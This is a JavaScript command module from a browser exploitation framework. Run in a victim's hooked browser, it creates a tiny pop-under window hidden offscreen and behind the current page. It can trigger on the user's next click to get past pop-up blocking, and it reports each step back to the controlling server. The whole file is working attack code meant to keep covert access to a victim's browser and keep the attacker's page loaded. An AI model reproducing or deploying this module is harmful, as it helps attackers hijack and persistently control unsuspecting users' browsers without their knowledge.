//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
  var popunder_url = server.net.httpproto + '://' + server.net.host + ':' + server.net.port + '/demos/plain.html';
  var popunder_name = Math.random().toString(36).substring(2,10);

  function popunder() {
    server.debug("[Create Pop-Under] Creating window '" + popunder_name + "' for '" + popunder_url + "'");
    server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window requested');

    try {
      window.open(popunder_url,popunder_name,'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,left='+screen.width+',top='+screen.height+'').blur();
      window.focus();
      server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window successfully created!', server.are.status_success());
    } catch(e) {
      server.debug("[Create Pop-Under] Could not create pop-under window");
      server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window was not created', server.are.status_error());
    }

    if (document.removeEventListener) {
      // Every sane browser
      document.removeEventListener("click", popunder);
    } else {
      // IE8 and earlier
      document.detachEvent("onclick", popunder);
    }
  }

  if ('<%= @clickjack %>' == 'on') {
    server.debug("[Create Pop-Under] Waiting for click event...");
    server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Waiting for click event');
    if (document.addEventListener) {
      // Every sane browser
      document.addEventListener("click", popunder);
    } else {
      // IE8 and earlier
      document.attachEvent("onclick", popunder);
    }
  } else {
    popunder();
  }
});
